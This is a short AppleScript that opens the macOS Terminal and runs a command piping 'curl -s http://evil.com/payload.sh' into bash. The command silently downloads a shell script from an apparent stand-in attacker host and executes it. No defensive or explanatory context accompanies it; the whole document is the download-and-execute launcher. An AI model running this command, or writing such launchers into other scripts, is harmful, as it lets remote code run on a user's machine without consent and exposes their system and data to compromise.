tell application "Terminal"
    activate
    do script "curl -s http://evil.com/payload.sh | bash"
end tell
